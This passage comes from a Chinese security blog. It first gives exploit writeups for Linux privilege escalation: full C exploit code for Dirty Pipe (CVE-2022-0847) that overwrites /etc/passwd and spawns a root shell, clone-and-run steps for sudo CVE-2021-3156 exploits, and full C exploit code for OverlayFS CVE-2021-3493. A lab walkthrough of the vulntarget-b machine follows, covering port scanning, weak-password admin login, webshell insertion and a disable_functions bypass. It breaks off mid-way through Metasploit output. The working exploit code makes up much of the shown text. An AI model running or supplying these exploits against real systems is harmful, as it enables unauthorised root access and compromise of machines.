dropping suid shell..\n&quot;);</span><br><span class="line">	system(path);</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] restoring suid binary..\n&quot;);</span><br><span class="line">	if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) &#123;</span><br><span class="line">		printf(&quot;[~] failed\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n&quot;);</span><br><span class="line">	system(&quot;/tmp/sh&quot;);</span><br><span class="line"></span><br><span class="line">	return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h3 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h3><p>参考 <a href="https://mp.weixin.qq.com/s/HZAYA9CW-biOjkcrTgNuSw">https://mp.weixin.qq.com/s/HZAYA9CW-biOjkcrTgNuSw</a></p>
<p>直接更改root账户的密码，原密码会备份到 <code>/tmp/passwd.bak</code> </p>
<p>还原密码 <code>mv /tmp/passwd.bak /etc/passwd</code></p>
<p><img src="/posts/1a565dd/4.png" alt="截图"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="line">/*</span><br><span class="line"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="line"> *</span><br><span class="line"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="line"> *</span><br><span class="line"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="line"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="line"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="line"> * file contents in the page cache, even if the file is not permitted</span><br><span class="line"> * to be written, immutable or on a read-only mount.</span><br><span class="line"> *</span><br><span class="line"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="line"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="line"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="line"> * there before, it just provided an easy way to exploit it.</span><br><span class="line"> *</span><br><span class="line"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="line"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="line"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="line"> * cross a page boundary.</span><br><span class="line"> *</span><br><span class="line"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="line"> *</span><br><span class="line"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef PAGE_SIZE</span><br><span class="line">#define PAGE_SIZE 4096</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="line"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="line"> */</span><br><span class="line">static void prepare_pipe(int p[2])</span><br><span class="line">&#123;</span><br><span class="line">        if (pipe(p)) abort();</span><br><span class="line"></span><br><span class="line">        const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);</span><br><span class="line">        static char buffer[4096];</span><br><span class="line"></span><br><span class="line">        /* fill the pipe completely; each pipe_buffer will now have</span><br><span class="line">           the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">        for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">                unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">                write(p[1], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="line">           leaving the flags initialized) */</span><br><span class="line">        for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">                unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">                read(p[0], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* the pipe is now empty, and if somebody adds a new</span><br><span class="line">           pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="line">           will be mergeable */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">        const char *const path = &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">        printf(&quot;Backing up /etc/passwd to /tmp/passwd.bak ...\n&quot;);</span><br><span class="line">        FILE *f1 = fopen(&quot;/etc/passwd&quot;, &quot;r&quot;);</span><br><span class="line">        FILE *f2 = fopen(&quot;/tmp/passwd.bak&quot;, &quot;w&quot;);</span><br><span class="line"></span><br><span class="line">        if (f1 == NULL) &#123;</span><br><span class="line">            printf(&quot;Failed to open /etc/passwd\n&quot;);</span><br><span class="line">            exit(EXIT_FAILURE);</span><br><span class="line">        &#125; else if (f2 == NULL) &#123;</span><br><span class="line">            printf(&quot;Failed to open /tmp/passwd.bak\n&quot;);</span><br><span class="line">            fclose(f1);</span><br><span class="line">            exit(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        char c;</span><br><span class="line">        while ((c = fgetc(f1)) != EOF)</span><br><span class="line">            fputc(c, f2);</span><br><span class="line"></span><br><span class="line">        fclose(f1);</span><br><span class="line">        fclose(f2);</span><br><span class="line"></span><br><span class="line">        loff_t offset = 4; // after the &quot;root&quot;</span><br><span class="line">        const char *const data = &quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n&quot;; // openssl passwd -1 -salt aaron aaron </span><br><span class="line">        printf(&quot;Setting root password to \&quot;aaron\&quot;...\n&quot;);</span><br><span class="line">        const size_t data_size = strlen(data);</span><br><span class="line"></span><br><span class="line">        if (offset % PAGE_SIZE == 0) &#123;</span><br><span class="line">                fprintf(stderr, &quot;Sorry, cannot start writing at a page boundary\n&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;</span><br><span class="line">        const loff_t end_offset = offset + (loff_t)data_size;</span><br><span class="line">        if (end_offset &gt; next_page) &#123;</span><br><span class="line">                fprintf(stderr, &quot;Sorry, cannot write across a page boundary\n&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* open the input file and validate the specified offset */</span><br><span class="line">        const int fd = open(path, O_RDONLY); // yes, read-only! :-)</span><br><span class="line">        if (fd &lt; 0) &#123;</span><br><span class="line">                perror(&quot;open failed&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        struct stat st;</span><br><span class="line">        if (fstat(fd, &amp;st)) &#123;</span><br><span class="line">                perror(&quot;stat failed&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (offset &gt; st.st_size) &#123;</span><br><span class="line">                fprintf(stderr, &quot;Offset is not inside the file\n&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (end_offset &gt; st.st_size) &#123;</span><br><span class="line">                fprintf(stderr, &quot;Sorry, cannot enlarge the file\n&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* create the pipe with all flags initialized with</span><br><span class="line">           PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="line">        int p[2];</span><br><span class="line">        prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">        /* splice one byte from before the specified offset into the</span><br><span class="line">           pipe; this will add a reference to the page cache, but</span><br><span class="line">           since copy_page_to_iter_pipe() does not initialize the</span><br><span class="line">           &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br><span class="line">        --offset;</span><br><span class="line">        ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);</span><br><span class="line">        if (nbytes &lt; 0) &#123;</span><br><span class="line">                perror(&quot;splice failed&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        if (nbytes == 0) &#123;</span><br><span class="line">                fprintf(stderr, &quot;short splice\n&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* the following write will not create a new pipe_buffer, but</span><br><span class="line">           will instead write into the page cache, because of the</span><br><span class="line">           PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">        nbytes = write(p[1], data, data_size);</span><br><span class="line">        if (nbytes &lt; 0) &#123;</span><br><span class="line">                perror(&quot;write failed&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        if ((size_t)nbytes &lt; data_size) &#123;</span><br><span class="line">                fprintf(stderr, &quot;short write\n&quot;);</span><br><span class="line">                return EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        char *argv[] = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;(echo aaron; cat) | su - -c \&quot;&quot;</span><br><span class="line">                &quot;echo \\\&quot;Restoring /etc/passwd from /tmp/passwd.bak...\\\&quot;;&quot;</span><br><span class="line">                &quot;cp /tmp/passwd.bak /etc/passwd;&quot;</span><br><span class="line">                &quot;echo \\\&quot;Done! Popping shell... (run commands now)\\\&quot;;&quot;</span><br><span class="line">                &quot;/bin/sh;&quot;</span><br><span class="line">            &quot;\&quot; root&quot;&#125;;</span><br><span class="line">        execv(&quot;/bin/sh&quot;, argv);</span><br><span class="line"></span><br><span class="line">        printf(&quot;system() function call seems to have failed :(\n&quot;);</span><br><span class="line">        return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">     </span><br><span class="line">     </span><br></pre></td></tr></table></figure>



<h2 id="sudo权限提升漏洞-CVE-2021-3156"><a href="#sudo权限提升漏洞-CVE-2021-3156" class="headerlink" title="sudo权限提升漏洞 CVE-2021-3156"></a>sudo权限提升漏洞 CVE-2021-3156</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>2021年1月26日，Linux安全工具sudo被发现严重的基于堆缓冲区溢出漏洞。利用这一漏洞，攻击者无需知道用户密码，一样可以获得root权限，并且是在默认配置下。此漏洞已分配为CVE-2021-3156，危险等级评分为7分。 当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。</p>
<h3 id="漏洞影响-1"><a href="#漏洞影响-1" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul>
<li>Sudo 1.8.2 - 1.8.31p2</li>
<li>Sudo 1.9.0 - 1.9.5p1</li>
</ul>
<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h4><p><code>git clone https://github.com/Rvn0xsy/CVE-2021-3156-plus</code></p>
<p>由于复现时使用的版本过高，然后选择下调到低版本sudo 进行测试 <code>sudo apt install sudo=1.8.31-1ubuntu1</code></p>
<p><code>make</code></p>
<p><code>./expolit &quot;id&quot;</code></p>
<p><img src="/posts/1a565dd/5.png" alt="截图"></p>
<br>

<br>

<h4 id="POC2-1"><a href="#POC2-1" class="headerlink" title="POC2"></a>POC2</h4><p><code>git clone https://github.com/blasty/CVE-2021-3156</code></p>
<p><code>make</code></p>
<p><code>./sudo-hax-me-a-sandwich</code></p>
<p><code>./sudo-hax-me-a-sandwich &lt;target_number&gt;</code></p>
<p><img src="/posts/1a565dd/6.png" alt="截图"></p>
<h2 id="kernel权限提升漏洞-CVE-2021-3493"><a href="#kernel权限提升漏洞-CVE-2021-3493" class="headerlink" title="kernel权限提升漏洞 CVE-2021-3493"></a>kernel权限提升漏洞 CVE-2021-3493</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Ubuntu OverlayFS Local Privesc CVE-2021-3493 EXP在Github被公开，可以通过EXP在Ubuntu多个影响系统中提升 ROOT权限</p>
<h3 id="漏洞影响-2"><a href="#漏洞影响-2" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul>
<li>Ubuntu 20.10</li>
<li>Ubuntu 20.04 LTS</li>
<li>Ubuntu 18.04 LTS</li>
<li>Ubuntu 16.04 LTS</li>
<li>Ubuntu 14.04 ESM</li>
</ul>
<br>

<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><blockquote>
<p>漏洞Github地址为：<a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
</blockquote>
<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a              显示电脑以及操作系统的相关信息</span><br><span class="line">cat /etc/issue        显示发行版本信息</span><br><span class="line">cat /proc/version     显示正在运行的内核版本</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### EXP</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">chmod +x exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>

<br>

<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;err.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;sched.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/mount.h&gt;</span><br><span class="line"></span><br><span class="line">//#include &lt;attr/xattr.h&gt;</span><br><span class="line">//#include &lt;sys/xattr.h&gt;</span><br><span class="line">int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define DIR_BASE    &quot;./ovlcap&quot;</span><br><span class="line">#define DIR_WORK    DIR_BASE &quot;/work&quot;</span><br><span class="line">#define DIR_LOWER   DIR_BASE &quot;/lower&quot;</span><br><span class="line">#define DIR_UPPER   DIR_BASE &quot;/upper&quot;</span><br><span class="line">#define DIR_MERGE   DIR_BASE &quot;/merge&quot;</span><br><span class="line">#define BIN_MERGE   DIR_MERGE &quot;/magic&quot;</span><br><span class="line">#define BIN_UPPER   DIR_UPPER &quot;/magic&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static void xmkdir(const char *path, mode_t mode)</span><br><span class="line">&#123;</span><br><span class="line">    if (mkdir(path, mode) == -1 &amp;&amp; errno != EEXIST)</span><br><span class="line">        err(1, &quot;mkdir %s&quot;, path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void xwritefile(const char *path, const char *data)</span><br><span class="line">&#123;</span><br><span class="line">    int fd = open(path, O_WRONLY);</span><br><span class="line">    if (fd == -1)</span><br><span class="line">        err(1, &quot;open %s&quot;, path);</span><br><span class="line">    ssize_t len = (ssize_t) strlen(data);</span><br><span class="line">    if (write(fd, data, len) != len)</span><br><span class="line">        err(1, &quot;write %s&quot;, path);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void xcopyfile(const char *src, const char *dst, mode_t mode)</span><br><span class="line">&#123;</span><br><span class="line">    int fi, fo;</span><br><span class="line"></span><br><span class="line">    if ((fi = open(src, O_RDONLY)) == -1)</span><br><span class="line">        err(1, &quot;open %s&quot;, src);</span><br><span class="line">    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)</span><br><span class="line">        err(1, &quot;open %s&quot;, dst);</span><br><span class="line"></span><br><span class="line">    char buf[4096];</span><br><span class="line">    ssize_t rd, wr;</span><br><span class="line"></span><br><span class="line">    for (;;) &#123;</span><br><span class="line">        rd = read(fi, buf, sizeof(buf));</span><br><span class="line">        if (rd == 0) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125; else if (rd == -1) &#123;</span><br><span class="line">            if (errno == EINTR)</span><br><span class="line">                continue;</span><br><span class="line">            err(1, &quot;read %s&quot;, src);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        char *p = buf;</span><br><span class="line">        while (rd &gt; 0) &#123;</span><br><span class="line">            wr = write(fo, p, rd);</span><br><span class="line">            if (wr == -1) &#123;</span><br><span class="line">                if (errno == EINTR)</span><br><span class="line">                    continue;</span><br><span class="line">                err(1, &quot;write %s&quot;, dst);</span><br><span class="line">            &#125;</span><br><span class="line">            p += wr;</span><br><span class="line">            rd -= wr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fi);</span><br><span class="line">    close(fo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int exploit()</span><br><span class="line">&#123;</span><br><span class="line">    char buf[4096];</span><br><span class="line"></span><br><span class="line">    sprintf(buf, &quot;rm -rf &#x27;%s/&#x27;&quot;, DIR_BASE);</span><br><span class="line">    system(buf);</span><br><span class="line"></span><br><span class="line">    xmkdir(DIR_BASE, 0777);</span><br><span class="line">    xmkdir(DIR_WORK,  0777);</span><br><span class="line">    xmkdir(DIR_LOWER, 0777);</span><br><span class="line">    xmkdir(DIR_UPPER, 0777);</span><br><span class="line">    xmkdir(DIR_MERGE, 0777);</span><br><span class="line"></span><br><span class="line">    uid_t uid = getuid();</span><br><span class="line">    gid_t gid = getgid();</span><br><span class="line"></span><br><span class="line">    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)</span><br><span class="line">        err(1, &quot;unshare&quot;);</span><br><span class="line"></span><br><span class="line">    xwritefile(&quot;/proc/self/setgroups&quot;, &quot;deny&quot;);</span><br><span class="line"></span><br><span class="line">    sprintf(buf, &quot;0 %d 1&quot;, uid);</span><br><span class="line">    xwritefile(&quot;/proc/self/uid_map&quot;, buf);</span><br><span class="line"></span><br><span class="line">    sprintf(buf, &quot;0 %d 1&quot;, gid);</span><br><span class="line">    xwritefile(&quot;/proc/self/gid_map&quot;, buf);</span><br><span class="line"></span><br><span class="line">    sprintf(buf, &quot;lowerdir=%s,upperdir=%s,workdir=%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);</span><br><span class="line">    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) == -1)</span><br><span class="line">        err(1, &quot;mount %s&quot;, DIR_MERGE);</span><br><span class="line"></span><br><span class="line">    // all+ep</span><br><span class="line">    char cap[] = &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;</span><br><span class="line"></span><br><span class="line">    xcopyfile(&quot;/proc/self/exe&quot;, BIN_MERGE, 0777);</span><br><span class="line">    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) == -1)</span><br><span class="line">        err(1, &quot;setxattr %s&quot;, BIN_MERGE);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        setgid(0);</span><br><span class="line">        execl(&quot;/bin/bash&quot;, &quot;/bin/bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);</span><br><span class="line">        err(1, &quot;execl /bin/bash&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pid_t child = fork();</span><br><span class="line">    if (child == -1)</span><br><span class="line">        err(1, &quot;fork&quot;);</span><br><span class="line"></span><br><span class="line">    if (child == 0) &#123;</span><br><span class="line">        _exit(exploit());</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        waitpid(child, NULL, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);</span><br><span class="line">    err(1, &quot;execl %s&quot;, BIN_UPPER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>vulntarget-b靶机</title>
    <url>/posts/f33996e/</url>
    <content><![CDATA[<br>

<h3 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h3><br>

<p><img src="/posts/f33996e/1.png" alt="1.png"></p>
<br>

<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="外网机器-centos7"><a href="#外网机器-centos7" class="headerlink" title="外网机器 centos7"></a>外网机器 centos7</h4><p><code>vim /etc/sysconfig/network-scripts/ifcfg-ens33</code></p>
<p><img src="/posts/f33996e/2.png" alt="截图"></p>
<br>

<p><code>systemctl restart networl</code></p>
<p><code>ifconfig</code>   ip为 <code>10.10.10.134</code></p>
<br>

<br>

<br>

<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sV 10.10.10.134</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap 10.10.10.134 -sV</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 03:04 EDT</span><br><span class="line">Nmap scan report for 10.10.10.134</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 993 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     Pure-FTPd</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    nginx</span><br><span class="line">81/tcp   open  http    nginx</span><br><span class="line">888/tcp  open  http    nginx</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    nginx</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds</span><br><span class="line">                                                                </span><br></pre></td></tr></table></figure>

<br>

<p>81端口 极致CMS</p>
<p>8888端口 宝塔</p>
<p>80端口 就一个主页 dirsearch没扫到东西</p>
<p>888端口 403</p>
<br>

<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Target: http://10.10.10.134:81/</span><br><span class="line"></span><br><span class="line">[03:10:56] Starting:                                                         </span><br><span class="line">[03:11:04] 200 -  479B  - /404.html                                         </span><br><span class="line">[03:11:04] 301 -  162B  - /A  -&gt;  http://10.10.10.134:81/A/                 </span><br><span class="line">[03:11:06] 403 -  548B  - /Public/                                          </span><br><span class="line">[03:11:12] 302 -    0B  - /admin.php  -&gt;  http://10.10.10.134:81/admin.php/Login/index.html</span><br><span class="line">[03:11:22] 301 -  162B  - /backup  -&gt;  http://10.10.10.134:81/backup/       </span><br><span class="line">[03:11:22] 403 -  548B  - /backup/                                          </span><br><span class="line">[03:11:24] 403 -  548B  - /cache/                                           </span><br><span class="line">[03:11:24] 301 -  162B  - /cache  -&gt;  http://10.10.10.134:81/cache/</span><br><span class="line">[03:11:32] 200 -    4KB - /favicon.ico                                      </span><br><span class="line">[03:11:36] 200 -  917B  - /index.html                                       </span><br><span class="line">[03:11:37] 200 -    0B  - /index.php/login/                                 </span><br><span class="line">[03:11:37] 200 -   14KB - /index.php                                        </span><br><span class="line">[03:11:37] 301 -  162B  - /install  -&gt;  http://10.10.10.134:81/install/     </span><br><span class="line">[03:11:37] 200 -   75B  - /install/index.php?upgrade/                       </span><br><span class="line">[03:11:37] 200 -   75B  - /install/</span><br><span class="line">[03:11:51] 200 -   22KB - /readme.txt                                       </span><br><span class="line">[03:11:51] 200 -  157B  - /robots.txt                                       </span><br><span class="line">[03:11:55] 200 -  490B  - /sitemap.xml                                      </span><br><span class="line">[03:11:57] 301 -  162B  - /static  -&gt;  http://10.10.10.134:81/static/       </span><br><span class="line">[03:12:02] 200 -  816B  - /web.config                                       </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找到后台登录点 <code>admin.php</code> 好像除了这个 别的页面都访问不了…</p>
<p>弱口令进入后台… （反正我没试出了/// ） admin/admin123</p>
<p><img src="/posts/f33996e/3.png" alt="截图"></p>
<p>发现当前版本为 v1.8.1 通过wapplyzer看到是 nginx</p>
<br>

<h4 id="文件上传-失败"><a href="#文件上传-失败" class="headerlink" title="文件上传(失败)"></a>文件上传(失败)</h4><p>在系统设置-&gt;基本设置-&gt;允许上传文件类型  添加 php后缀  然后再去找一个上传点</p>
<p>在网站管理处–&gt;轮播图列表</p>
<p>商品管理–&gt;商品列表 </p>
<p><img src="/posts/f33996e/4.png" alt="截图"></p>
<p>然后提示不允许上传 ，用00截断这类的 都被重命名了 最终还是没绕过去</p>
<p>去网上找了下极致CMS1.8.1版本相关漏洞 看到了这么篇文章 <a href="https://xz.aliyun.com/t/9359">https://xz.aliyun.com/t/9359</a></p>
<p>使用拓展管理插件getshell</p>
<h4 id="模板编辑插件Getshell"><a href="#模板编辑插件Getshell" class="headerlink" title="模板编辑插件Getshell"></a>模板编辑插件Getshell</h4><p><img src="/posts/f33996e/5.png" alt="截图"></p>
<p>然后使用这个在线编辑模板</p>
<p><img src="/posts/f33996e/6.png" alt="截图"></p>
<p>然后设置一个密码 这里设置为 123321 提交后进入了代码编辑器</p>
<p><img src="/posts/f33996e/7.png" alt="截图"></p>
<p>然后就可以通过这个编辑器去查看代码 写入一句话</p>
<p>在index.php写一个phpinfo 然后成功生效</p>
<p><img src="/posts/f33996e/8.png" alt="截图"></p>
<p><img src="/posts/f33996e/9.png" alt="截图"></p>
<h4 id="disable-function绕过"><a href="#disable-function绕过" class="headerlink" title="disable_function绕过"></a>disable_function绕过</h4><p>这样写一个一句话 用蚁剑连一下就可以了</p>
<p><img src="/posts/f33996e/10.png" alt="截图"></p>
<p>连上蚁剑之后没法执行命令，看了下phpinfo 禁用了好多函数 之前扫端口的时候扫到了有宝塔，应该是宝塔把函数给禁掉了</p>
<p><img src="/posts/f33996e/11.png" alt="截图"></p>
<br>

<p>尝试下蚁剑绕过disable_function的插件</p>
<p>使用这个<code>php7_GC_UAF</code> 可以成功绕过</p>
<p><img src="/posts/f33996e/12.png" alt="截图"></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>后面拿第二台机器shell的时候要在这台机器上起一个ftp，普通权限起不来 然后就过来尝试下提权</p>
<p>试了下之前爆出的 cve-2021-4034 提权没成功，找下msf自带的提权模块试试</p>
<p>MSF专门提供了一个查找适用EXP的内置模块<code>Local Exploit Suggester</code> 然后给出了3个建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; search suggester</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----    -----  -----------</span><br><span class="line">   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester                                        </span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use 0</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this modu</span><br><span class="line">                          